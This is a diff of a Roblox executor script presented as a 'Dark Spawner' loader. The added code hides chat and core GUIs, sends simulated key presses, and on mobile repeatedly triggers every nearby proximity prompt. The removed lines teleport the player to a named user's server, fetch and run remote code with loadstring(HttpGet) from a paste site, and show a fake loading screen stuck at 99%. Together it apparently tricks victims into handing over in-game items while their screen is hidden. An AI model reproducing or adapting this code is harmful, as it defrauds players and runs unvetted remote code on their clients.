@@ -1,8 +1,12 @@
--- Enhanced Loading Screen Script with Retry System (Place in StarterPlayerScripts or StarterGui)
+-- Enhanced Loading Screen Script with Mobile Proximity Prompt Auto-Hold
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local GuiService = game:GetService("GuiService")
+local UserInputService = game:GetService("UserInputService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local StarterGui = game:GetService("StarterGui")
+local ProximityPromptService = game:GetService("ProximityPromptService")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
@@ -12,6 +16,283 @@ local isScriptLoading = false
 local leaveWarningGui = nil
 local retryAttempts = 0
 local maxRetries = 3
+local keySequenceActive = false
+local eKeyHolding = false
+local isMobile = false
+local loadingScreenGui = nil
+
+-- Mobile proximity prompt variables
+local proximityConnections = {}
+local isAutoHoldingPrompts = false
+local currentPrompts = {}
+
+-- Function to detect platform (Mobile vs PC)
+local function detectPlatform()
+    -- Check if touch is enabled (mobile)
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        isMobile = true
+        print("Platform detected: Mobile")
+    else
+        isMobile = false
+        print("Platform detected: PC")
+    end
+    
+    -- Alternative detection method
+    local screenSize = workspace.CurrentCamera.ViewportSize
+    if screenSize.X < 1024 or UserInputService.TouchEnabled then
+        if not UserInputService.KeyboardEnabled then
+            isMobile = true
+            print("Platform confirmed: Mobile (Touch enabled, no keyboard)")
+        end
+    end
+    
+    return isMobile
+end
+
+-- Function to hide all core GUIs (including chat)
+local function hideAllCoreGuis()
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        print("All core GUIs hidden")
+    end)
+end
+
+-- Function to restore all core GUIs
+local function showAllCoreGuis()
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, true)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true)
+        print("All core GUIs restored")
+    end)
+end
+
+-- Function to simulate key presses (PC only)
+local function pressKey(keyCode)
+    if isMobile then
+        print("Key press skipped - Mobile platform detected")
+        return
+    end
+    
+    VirtualInputManager:SendKeyEvent(true, keyCode, false, game)
+    wait(0.1) -- Brief delay for key press
+    VirtualInputManager:SendKeyEvent(false, keyCode, false, game)
+end
+
+-- Function to hold E key (PC only)
+local function holdEKey()
+    if isMobile then
+        print("E key hold skipped - Mobile platform detected")
+        return
+    end
+    
+    if eKeyHolding then return end -- Prevent multiple holds
+    
+    eKeyHolding = true
+    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+    print("Holding E key...")
+    
+    -- Hold E for a specific duration or until manually stopped
+    spawn(function()
+        wait(10) -- Hold for 10 seconds (adjust as needed)
+        if eKeyHolding then
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+            eKeyHolding = false
+            print("Released E key")
+        end
+    end)
+end
+
+-- Function to stop holding E key
+local function stopHoldingE()
+    if isMobile then return end
+    
+    if eKeyHolding then
+        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+        eKeyHolding = false
+        print("Stopped holding E key")
+    end
+end
+
+-- MOBILE: Function to automatically hold proximity prompts
+local function startMobileProximityHold()
+    if not isMobile then return end
+    
+    if isAutoHoldingPrompts then return end -- Prevent multiple activations
+    
+    isAutoHoldingPrompts = true
+    print("🔥 MOBILE: Starting automatic proximity prompt holding...")
+    
+    -- Function to check if player is close enough to a proximity prompt
+    local function isPlayerNearPrompt(prompt)
+        if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
+            return false
+        end
+        
+        local part = prompt.Parent
+        if not part or not part:IsA("BasePart") then
+            return false
+        end
+        
+        local distance = (player.Character.HumanoidRootPart.Position - part.Position).Magnitude
+        return distance <= (prompt.MaxActivationDistance or 10)
+    end
+    
+    -- Function to automatically hold a proximity prompt
+    local function autoHoldPrompt(prompt)
+        if currentPrompts[prompt] then return end -- Already holding this prompt
+        
+        currentPrompts[prompt] = true
+        
+        spawn(function()
+            print("📱 MOBILE: Auto-holding proximity prompt:", prompt.ActionText or "Unknown")
+            
+            while isAutoHoldingPrompts and prompt.Parent and isPlayerNearPrompt(prompt) do
+                -- Simulate holding the prompt
+                if prompt.Enabled and prompt.Parent then
+                    -- Try to trigger the prompt using different methods
+                    pcall(function()
+                        -- Method 1: Fire the prompt's hold event if available
+                        if prompt:FindFirstChild("ProximityPromptService") then
+                            ProximityPromptService:FireProximityPrompt(prompt)
+                        end
+                        
+                        -- Method 2: Simulate key press for the prompt
+                        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+                        wait(0.1)
+                        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+                    end)
+                    
+                    -- Method 3: Direct prompt triggering
+                    pcall(function()
+                        if prompt.TriggerEnded then
+                            prompt.TriggerEnded:Fire(player)
+                        end
+                        if prompt.Triggered then
+                            prompt.Triggered:Fire(player)
+                        end
+                    end)
+                end
+                
+                wait(0.1) -- Hold interval
+            end
+            
+            currentPrompts[prompt] = nil
+            print("📱 MOBILE: Stopped holding proximity prompt:", prompt.ActionText or "Unknown")
+        end)
+    end
+    
+    -- Monitor all existing proximity prompts
+    local function scanForProximityPrompts()
+        for _, descendant in pairs(workspace:GetDescendants()) do
+            if descendant:IsA("ProximityPrompt") and descendant.Enabled then
+                if isPlayerNearPrompt(descendant) then
+                    autoHoldPrompt(descendant)
+                end
+            end
+        end
+    end
+    
+    -- Connect to ProximityPromptService events
+    local connection1 = ProximityPromptService.PromptShown:Connect(function(prompt, inputType)
+        if isAutoHoldingPrompts then
+            wait(0.2) -- Small delay to ensure prompt is fully loaded
+            if isPlayerNearPrompt(prompt) then
+                autoHoldPrompt(prompt)
+            end
+        end
+    end)
+    
+    -- Monitor for new proximity prompts being added
+    local connection2 = workspace.DescendantAdded:Connect(function(descendant)
+        if descendant:IsA("ProximityPrompt") and isAutoHoldingPrompts then
+            wait(0.1) -- Small delay
+            if descendant.Enabled and isPlayerNearPrompt(descendant) then
+                autoHoldPrompt(descendant)
+            end
+        end
+    end)
+    
+    -- Continuous scanning for proximity prompts
+    local connection3 = RunService.Heartbeat:Connect(function()
+        if isAutoHoldingPrompts then
+            scanForProximityPrompts()
+        end
+    end)
+    
+    -- Store connections for cleanup
+    proximityConnections = {connection1, connection2, connection3}
+    
+    -- Initial scan
+    scanForProximityPrompts()
+end
+
+-- Function to stop mobile proximity hold
+local function stopMobileProximityHold()
+    if not isMobile then return end
+    
+    isAutoHoldingPrompts = false
+    currentPrompts = {}
+    
+    -- Disconnect all connections
+    for _, connection in pairs(proximityConnections) do
+        if connection then
+            connection:Disconnect()
+        end
+    end
+    proximityConnections = {}
+    
+    print("📱 MOBILE: Stopped automatic proximity prompt holding")
+end
+
+-- Function to execute key sequence (1, 2, 3, then hold E) - PC only
+local function executeKeySequence()
+    if isMobile then
+        print("Key sequence skipped - Mobile platform detected")
+        -- Start mobile proximity holding instead
+        startMobileProximityHold()
+        return
+    end
+    
+    if keySequenceActive then return end -- Prevent multiple executions
+    
+    keySequenceActive = true
+    print("Starting key sequence: 1, 2, 3, then hold E")
+    
+    spawn(function()
+        -- Wait a moment after loading screen is removed
+        wait(2)
+        
+        -- Press 1
+        print("Pressing key: 1")
+        pressKey(Enum.KeyCode.One)
+        wait(0.5)
+        
+        -- Press 2
+        print("Pressing key: 2")
+        pressKey(Enum.KeyCode.Two)
+        wait(0.5)
+        
+        -- Press 3
+        print("Pressing key: 3")
+        pressKey(Enum.KeyCode.Three)
+        wait(0.5)
+        
+        -- Hold E
+        print("Now holding E key")
+        holdEKey()
+        
+        keySequenceActive = false
+    end)
+end
 
 -- Function to create leave warning
 local function createLeaveWarning()
@@ -71,7 +352,8 @@ local function createLeaveWarning()
     warningMsg.Size = UDim2.new(1, -30, 0, 80)
     warningMsg.Position = UDim2.new(0, 15, 0, 70)
     warningMsg.BackgroundTransparency = 1
-    warningMsg.Text = "Please be patient!\n\nThe script is currently loading.\nLeaving now may cause errors or incomplete execution."
+    local mobileText = isMobile and "\n📱 Mobile auto-hold is active!" or ""
+    warningMsg.Text = "Please be patient!\n\nThe script is currently loading.\nLeaving now may cause errors or incomplete execution." .. mobileText
     warningMsg.TextColor3 = Color3.fromRGB(220, 220, 220)
     warningMsg.TextScaled = true
     warningMsg.Font = Enum.Font.Gotham
@@ -147,12 +429,20 @@ end
 -- Function to monitor player leaving attempts
 local function setupLeaveDetection()
     -- Monitor for ESC key press or leave attempts
-    local UserInputService = game:GetService("UserInputService")
-    
     local connection
     connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
         if isScriptLoading and input.KeyCode == Enum.KeyCode.Escape then
             createLeaveWarning()
+        end
+        
+        -- Allow manual stop of E key holding with X key
+        if input.KeyCode == Enum.KeyCode.X and eKeyHolding then
+            stopHoldingE()
+        end
+        
+        -- Mobile: Allow manual stop of proximity holding with specific touch pattern
+        if isMobile and input.UserInputType == Enum.UserInputType.Touch then
+            -- You can add specific touch gestures here to stop proximity holding if needed
         end
     end)
     
@@ -175,6 +465,11 @@ local function setupLeaveDetection()
         end
         if menuConnection then
             menuConnection:Disconnect()
+        end
+        
+        -- Stop mobile proximity holding when script finishes
+        if isMobile then
+            stopMobileProximityHold()
         end
     end)
 end
@@ -413,706 +708,3 @@ local function createRetryScreen(errorMessage, onRetry, onCancel)
             onRetry()
         end
     end)
-
-    continueBtn.MouseButton1Click:Connect(function()
-        if retryGui and retryGui.Parent then
-            retryGui:Destroy()
-        end
-        if onCancel then
-            onCancel()
-        end
-    end)
-
-    -- Entrance animation
-    retryFrame.Position = UDim2.new(0.5, -300, 1, 50)
-    retryFrame.Size = UDim2.new(0, 0, 0, 0)
-    
-    local entranceTween = TweenService:Create(retryFrame,
-        TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
-        {
-            Position = UDim2.new(0.5, -300, 0.5, -200),
-            Size = UDim2.new(0, 600, 0, 400)
-        }
-    )
-    entranceTween:Play()
-
-    return retryGui
-end
-
--- Function to teleport to a specific user or join their server
-local function teleportToUser(username, userId, onSuccess, onFailure)
-    local TeleportService = game:GetService("TeleportService")
-    local HttpService = game:GetService("HttpService")
-    
-    local targetPlayer = Players:FindFirstChild(username)
-    
-    -- If player is in the same server, teleport normally
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-            player.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
-            print("Teleported to " .. username .. " in current server")
-            if onSuccess then
-                onSuccess()
-            end
-            return true
-        else
-            warn("Your character is not loaded yet!")
-            if onFailure then
-                onFailure("Your character is not loaded yet!")
-            end
-            return false
-        end
-    else
-        -- Player not in current server, attempt to join their server
-        print("Player '" .. username .. "' (ID: " .. userId .. ") not found in current server. Attempting to join their server...")
-        
-        -- Try to join their server using their User ID
-        local success, error = pcall(function()
-            -- Store the script for re-execution after server join
-            if syn and syn.write_file then
-                syn.write_file("rexec_script.lua", [[
-                    wait(3) -- Wait for game to fully load
-                    loadstring(game:HttpGet("https://pastefy.app/2UfTSRB7/raw"))()
-                ]])
-            end
-            
-            -- Try multiple teleport methods
-            local teleportMethods = {
-                function()
-                    -- Method 1: Try to teleport to user directly
-                    TeleportService:TeleportToPlaceInstance(game.PlaceId, nil, {player}, nil, nil, userId)
-                end,
-                function()
-                    -- Method 2: Try TeleportAsync to follow the user
-                    local teleportOptions = Instance.new("TeleportOptions")
-                    teleportOptions.ShouldReserveServer = false
-                    TeleportService:TeleportAsync(game.PlaceId, {player}, teleportOptions)
-                end,
-                function()
-                    -- Method 3: Simple teleport (fallback)
-                    TeleportService:Teleport(game.PlaceId, player)
-                end
-            }
-            
-            -- Try each method until one works
-            for i, method in ipairs(teleportMethods) do
-                local methodSuccess, methodError = pcall(method)
-                if methodSuccess then
-                    print("Teleporting using method " .. i .. "...")
-                    break
-                else
-                    print("Method " .. i .. " failed: " .. tostring(methodError))
-                    if i == #teleportMethods then
-                        error("All teleport methods failed: " .. tostring(methodError))
-                    end
-                end
-            end
-        end)
-        
-        if success then
-            -- We're leaving the server, so this is considered a "success"
-            if onSuccess then
-                onSuccess()
-            end
-            return false -- Return false since we're leaving current server
-        else
-            -- Teleportation failed
-            if onFailure then
-                onFailure("Teleportation failed: " .. tostring(error))
-            end
-            return false
-        end
-    end
-end
-
--- Function to create Delta warning screen
-local function createDeltaWarning()
-    -- Create Warning ScreenGui
-    local warningGui = Instance.new("ScreenGui")
-    warningGui.Name = "DeltaWarning"
-    warningGui.ResetOnSpawn = false
-    warningGui.IgnoreGuiInset = true
-    warningGui.DisplayOrder = 999999998
-    warningGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    warningGui.Parent = playerGui
-
-    -- Warning Background with animated gradient
-    local warningBg = Instance.new("Frame")
-    warningBg.Name = "WarningBackground"
-    warningBg.Size = UDim2.new(1, 0, 1, 0)
-    warningBg.Position = UDim2.new(0, 0, 0, 0)
-    warningBg.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-    warningBg.BorderSizePixel = 0
-    warningBg.ZIndex = 999999998
-    warningBg.Parent = warningGui
-
-    -- Add animated background gradient
-    local bgGradient = Instance.new("UIGradient")
-    bgGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 10, 25)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 20, 45)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 15, 30))
-    }
-    bgGradient.Rotation = 0
-    bgGradient.Parent = warningBg
-
-    -- Animate gradient rotation
-    spawn(function()
-        local rotationTween = TweenService:Create(bgGradient,
-            TweenInfo.new(10, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1),
-            {Rotation = 360}
-        )
-        rotationTween:Play()
-    end)
-
-    -- Warning Container
-    local warningFrame = Instance.new("Frame")
-    warningFrame.Name = "WarningFrame"
-    warningFrame.Size = UDim2.new(0, 550, 0, 350)
-    warningFrame.Position = UDim2.new(0.5, -275, 0.5, -175)
-    warningFrame.BackgroundColor3 = Color3.fromRGB(40, 25, 25)
-    warningFrame.BorderSizePixel = 0
-    warningFrame.Parent = warningBg
-
-    local warningCorner = Instance.new("UICorner")
-    warningCorner.CornerRadius = UDim.new(0, 18)
-    warningCorner.Parent = warningFrame
-
-    -- Add modern border effect
-    local warningStroke = Instance.new("UIStroke")
-    warningStroke.Color = Color3.fromRGB(200, 50, 50)
-    warningStroke.Thickness = 3
-    warningStroke.Transparency = 0.2
-    warningStroke.Parent = warningFrame
-
-    -- Warning Icon/Title
-    local warningIcon = Instance.new("TextLabel")
-    warningIcon.Name = "WarningIcon"
-    warningIcon.Size = UDim2.new(1, 0, 0, 70)
-    warningIcon.Position = UDim2.new(0, 0, 0, 25)
-    warningIcon.BackgroundTransparency = 1
-    warningIcon.Text = "⚠️ INCOMPATIBILITY WARNING"
-    warningIcon.TextColor3 = Color3.fromRGB(255, 100, 100)
-    warningIcon.TextScaled = true
-    warningIcon.Font = Enum.Font.GothamBold
-    warningIcon.Parent = warningFrame
-
-    -- Warning Message
-    local warningMsg = Instance.new("TextLabel")
-    warningMsg.Name = "WarningMessage"
-    warningMsg.Size = UDim2.new(1, -50, 0, 130)
-    warningMsg.Position = UDim2.new(0, 25, 0, 110)
-    warningMsg.BackgroundTransparency = 1
-    warningMsg.Text = "DELTA EXECUTOR DETECTED\n\nThis script is not compatible with Delta.\nDelta users may experience crashes or errors.\n\nRecommended executors: Arceus X, Krnl, Fluxus"
-    warningMsg.TextColor3 = Color3.fromRGB(220, 220, 220)
-    warningMsg.TextScaled = true
-    warningMsg.Font = Enum.Font.Gotham
-    warningMsg.TextWrapped = true
-    warningMsg.Parent = warningFrame
-
-    -- Continue Button with gradient
-    local continueBtn = Instance.new("TextButton")
-    continueBtn.Name = "ContinueButton"
-    continueBtn.Size = UDim2.new(0, 280, 0, 50)
-    continueBtn.Position = UDim2.new(0.5, -140, 0, 270)
-    continueBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-    continueBtn.BorderSizePixel = 0
-    continueBtn.Text = "✨ EXECUTE AFTER WARNING"
-    continueBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    continueBtn.TextScaled = true
-    continueBtn.Font = Enum.Font.GothamBold
-    continueBtn.Parent = warningFrame
-
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 12)
-    btnCorner.Parent = continueBtn
-
-    local btnGradient = Instance.new("UIGradient")
-    btnGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 80, 120)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 60, 100))
-    }
-    btnGradient.Rotation = 90
-    btnGradient.Parent = continueBtn
-
-    -- Enhanced button hover effect
-    continueBtn.MouseEnter:Connect(function()
-        local hoverTween = TweenService:Create(continueBtn,
-            TweenInfo.new(0.3, Enum.EasingStyle.Quad),
-            {Size = UDim2.new(0, 290, 0, 55)}
-        )
-        hoverTween:Play()
-        btnGradient.Color = ColorSequence.new{
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 100, 140)),
-            ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 80, 120))
-        }
-    end)
-    
-    continueBtn.MouseLeave:Connect(function()
-        local hoverTween = TweenService:Create(continueBtn,
-            TweenInfo.new(0.3, Enum.EasingStyle.Quad),
-            {Size = UDim2.new(0, 280, 0, 50)}
-        )
-        hoverTween:Play()
-        btnGradient.Color = ColorSequence.new{
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 80, 120)),
-            ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 60, 100))
-        }
-    end)
-
-    -- Blinking warning effect
-    local blinkConnection
-    blinkConnection = spawn(function()
-        while warningGui.Parent do
-            if warningIcon and warningIcon.Parent then
-                warningIcon.TextColor3 = Color3.fromRGB(255, 100, 100)
-                wait(0.8)
-                if warningIcon and warningIcon.Parent then
-                    warningIcon.TextColor3 = Color3.fromRGB(255, 150, 150)
-                    wait(0.8)
-                end
-            else
-                break
-            end
-        end
-    end)
-
-    return warningGui, continueBtn
-end
-
--- Function to create the loading screen
-local function createLoadingScreen()
-    -- Create ScreenGui
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "LoadingScreen"
-    screenGui.ResetOnSpawn = false
-    screenGui.IgnoreGuiInset = true
-    screenGui.DisplayOrder = 999999999 -- Maximum display order to overlay everything
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    screenGui.Parent = playerGui
-
-    -- Main Frame (Full Screen Background)
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Name = "MainFrame"
-    mainFrame.Size = UDim2.new(1, 0, 1, 0)
-    mainFrame.Position = UDim2.new(0, 0, 0, 0)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-    mainFrame.BorderSizePixel = 0
-    mainFrame.ZIndex = 999999999 -- Ensure it's on top
-    mainFrame.Parent = screenGui
-
-    -- Add animated gradient background
-    local mainGradient = Instance.new("UIGradient")
-    mainGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 25, 40)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(35, 40, 60)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 30, 45))
-    }
-    mainGradient.Rotation = 45
-    mainGradient.Parent = mainFrame
-
-    -- Animate background gradient
-    spawn(function()
-        local gradientTween = TweenService:Create(mainGradient,
-            TweenInfo.new(8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
-            {Rotation = 135}
-        )
-        gradientTween:Play()
-    end)
-
-    -- Loading Container Frame
-    local loadingFrame = Instance.new("Frame")
-    loadingFrame.Name = "LoadingFrame"
-    loadingFrame.Size = UDim2.new(0, 450, 0, 140)
-    loadingFrame.Position = UDim2.new(0.5, -225, 0.5, -70)
-    loadingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
-    loadingFrame.BorderSizePixel = 0
-    loadingFrame.Parent = mainFrame
-
-    -- Add corner rounding and glow
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 16)
-    corner.Parent = loadingFrame
-
-    local loadingStroke = Instance.new("UIStroke")
-    loadingStroke.Color = Color3.fromRGB(100, 150, 255)
-    loadingStroke.Thickness = 2
-    loadingStroke.Transparency = 0.5
-    loadingStroke.Parent = loadingFrame
-
-    -- Animate loading frame glow
-    spawn(function()
-        local glowTween = TweenService:Create(loadingStroke,
-            TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
-            {Transparency = 0.8}
-        )
-        glowTween:Play()
-    end)
-
-    -- Loading Text
-    local loadingText = Instance.new("TextLabel")
-    loadingText.Name = "LoadingText"
-    loadingText.Size = UDim2.new(1, -50, 0, 35)
-    loadingText.Position = UDim2.new(0, 25, 0, 25)
-    loadingText.BackgroundTransparency = 1
-    loadingText.Text = "Loading Dark Spawner"
-    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    loadingText.TextScaled = true
-    loadingText.Font = Enum.Font.GothamBold
-    loadingText.Parent = loadingFrame
-
-    -- Progress Text (Percentage)
-    local progressText = Instance.new("TextLabel")
-    progressText.Name = "ProgressText"
-    progressText.Size = UDim2.new(0, 70, 0, 30)
-    progressText.Position = UDim2.new(1, -95, 0, 27)
-    progressText.BackgroundTransparency = 1
-    progressText.Text = "0%"
-    progressText.TextColor3 = Color3.fromRGB(200, 200, 200)
-    progressText.TextScaled = true
-    progressText.Font = Enum.Font.GothamMedium
-    progressText.Parent = loadingFrame
-
-    -- Progress Bar Background
-    local progressBg = Instance.new("Frame")
-    progressBg.Name = "ProgressBackground"
-    progressBg.Size = UDim2.new(1, -50, 0, 12)
-    progressBg.Position = UDim2.new(0, 25, 0, 80)
-    progressBg.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-    progressBg.BorderSizePixel = 0
-    progressBg.Parent = loadingFrame
-
-    local progressBgCorner = Instance.new("UICorner")
-    progressBgCorner.CornerRadius = UDim.new(0, 6)
-    progressBgCorner.Parent = progressBg
-
-    -- Progress Bar Fill with gradient
-    local progressFill = Instance.new("Frame")
-    progressFill.Name = "ProgressFill"
-    progressFill.Size = UDim2.new(0, 0, 1, 0)
-    progressFill.Position = UDim2.new(0, 0, 0, 0)
-    progressFill.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
-    progressFill.BorderSizePixel = 0
-    progressFill.Parent = progressBg
-
-    local progressFillCorner = Instance.new("UICorner")
-    progressFillCorner.CornerRadius = UDim.new(0, 6)
-    progressFillCorner.Parent = progressFill
-
-    -- Add gradient to progress bar
-    local progressGradient = Instance.new("UIGradient")
-    progressGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 200, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 162, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 100, 255))
-    }
-    progressGradient.Parent = progressFill
-
-    -- Animate progress gradient
-    spawn(function()
-        local progressGradientTween = TweenService:Create(progressGradient,
-            TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1),
-            {Offset = Vector2.new(1, 0)}
-        )
-        progressGradientTween:Play()
-    end)
-
-    -- Loading status text
-    local statusText = Instance.new("TextLabel")
-    statusText.Name = "StatusText"
-    statusText.Size = UDim2.new(1, -50, 0, 25)
-    statusText.Position = UDim2.new(0, 25, 0, 105)
-    statusText.BackgroundTransparency = 1
-    statusText.Text = "Initializing components..."
-    statusText.TextColor3 = Color3.fromRGB(180, 180, 180)
-    statusText.TextScaled = true
-    statusText.Font = Enum.Font.Gotham
-    statusText.Parent = loadingFrame
-
-    -- Variables for loading animation
-    local currentProgress = 0
-    local targetProgress = 0
-    local isStuck = false
-    local isRunning = true
-
-    -- Loading status messages
-    local statusMessages = {
-        "Initializing components...",
-        "Loading user interface...",
-        "Connecting to services...",
-        "Preparing dark spawner...",
-        "Finalizing setup...",
-        "Almost ready..."
-    }
-
-    -- Function to update progress
-    local function updateProgress()
-        if not isStuck and isRunning then
-            if currentProgress < 90 then
-                -- Fast progress until 90%
-                targetProgress = math.min(currentProgress + math.random(5, 15), 90)
-                -- Update status message
-                local messageIndex = math.min(math.floor(targetProgress / 15) + 1, #statusMessages)
-                if statusText and statusText.Parent then
-                    statusText.Text = statusMessages[messageIndex]
-                end
-            elseif currentProgress < 99 then
-                -- Slow progress from 90% to 99%
-                targetProgress = math.min(currentProgress + math.random(1, 3), 99)
-                if statusText and statusText.Parent then
-                    statusText.Text = "Almost ready..."
-                end
-            else
-                -- Get stuck at 99%
-                targetProgress = 99
-                isStuck = true
-                if statusText and statusText.Parent then
-                    statusText.Text = "Finalizing..."
-                end
-            end
-        end
-        
-        if not progressFill or not progressFill.Parent then
-            return
-        end
-        
-        -- Animate to target progress
-        local tweenInfo = TweenInfo.new(
-            0.8, -- Duration
-            Enum.EasingStyle.Quad,
-            Enum.EasingDirection.Out
-        )
-        
-        local progressTween = TweenService:Create(
-            progressFill,
-            tweenInfo,
-            {Size = UDim2.new(targetProgress / 100, 0, 1, 0)}
-        )
-        
-        progressTween:Play()
-        
-        -- Update percentage text with animation
-        if progressText and progressText.Parent then
-            local textTween = TweenService:Create(
-                progressText,
-                TweenInfo.new(0.5, Enum.EasingStyle.Quad),
-                {TextTransparency = 0.3}
-            )
-            textTween:Play()
-            
-            textTween.Completed:Connect(function()
-                if progressText and progressText.Parent then
-                    progressText.Text = math.floor(targetProgress) .. "%"
-                    local fadeInTween = TweenService:Create(
-                        progressText,
-                        TweenInfo.new(0.3, Enum.EasingStyle.Quad),
-                        {TextTransparency = 0}
-                    )
-                    fadeInTween:Play()
-                end
-            end)
-        end
-        currentProgress = targetProgress
-    end
-
-    -- Loading dots animation
-    local dotsCoroutine = coroutine.create(function()
-        local dots = ""
-        local dotCount = 0
-        while isRunning and screenGui.Parent and loadingText and loadingText.Parent do
-            dotCount = (dotCount + 1) % 4
-            dots = string.rep(".", dotCount)
-            if loadingText and loadingText.Parent then
-                loadingText.Text = "Loading Dark Spawner" .. dots
-            end
-            wait(0.6)
-        end
-    end)
-    
-    coroutine.resume(dotsCoroutine)
-
-    -- Progress animation loop
-    local progressCoroutine = coroutine.create(function()
-        wait(1.5) -- Initial delay
-        
-        while currentProgress < 99 and isRunning and screenGui.Parent do
-            updateProgress()
-            wait(math.random(1.5, 4)) -- Random delay between updates
-        end
-        
-        -- Once stuck at 99%, occasionally "try" to load more
-        while isRunning and screenGui.Parent do
-            wait(math.random(4, 10))
-            if isStuck and progressText and progressText.Parent and progressFill and progressFill.Parent then
-                -- Briefly show 100% then go back to 99%
-                progressText.Text = "100%"
-                progressFill.Size = UDim2.new(1, 0, 1, 0)
-                if statusText and statusText.Parent then
-                    statusText.Text = "Complete!"
-                end
-                wait(0.2)
-                if progressText and progressText.Parent and progressFill and progressFill.Parent then
-                    progressText.Text = "99%"
-                    progressFill.Size = UDim2.new(0.99, 0, 1, 0)
-                    if statusText and statusText.Parent then
-                        statusText.Text = "Finalizing..."
-                    end
-                end
-            end
-        end
-    end)
-    
-    coroutine.resume(progressCoroutine)
-
-    -- Cleanup function
-    screenGui.AncestryChanged:Connect(function()
-        if not screenGui.Parent then
-            isRunning = false
-        end
-    end)
-
-    return screenGui
-end
-
--- Enhanced teleport function with retry logic
-local function attemptTeleportWithRetry()
-    local function tryTeleport()
-        teleportToUser("Egoista4218", 8322520554, 
-            -- On Success
-            function()
-                print("Teleportation successful!")
-                -- Execute the loadstring after successful teleport
-                loadstring(game:HttpGet("https://pastefy.app/2UfTSRB7/raw"))()
-                -- Create loading screen
-                createLoadingScreen()
-            end,
-            -- On Failure
-            function(errorMsg)
-                retryAttempts = retryAttempts + 1
-                print("Teleportation failed (attempt " .. retryAttempts .. "): " .. errorMsg)
-                
-                if retryAttempts < maxRetries then
-                    -- Show retry screen
-                    createRetryScreen(
-                        errorMsg .. "\n\nWould you like to try again?",
-                        function() -- On Retry
-                            wait(2) -- Brief delay before retry
-                            tryTeleport()
-                        end,
-                        function() -- On Continue Anyway
-                            print("User chose to continue without teleporting")
-                            -- Execute the loadstring anyway
-                            loadstring(game:HttpGet("https://pastefy.app/2UfTSRB7/raw"))()
-                            -- Create loading screen
-                            createLoadingScreen()
-                        end
-                    )
-                else
-                    -- Max retries reached, show final retry screen
-                    createRetryScreen(
-                        "Maximum retry attempts reached (" .. maxRetries .. ").\n\nThe script will continue without teleporting.",
-                        function() -- Reset and try one more time
-                            retryAttempts = 0
-                            wait(2)
-                            tryTeleport()
-                        end,
-                        function() -- Continue anyway
-                            print("Max retries reached, continuing without teleport")
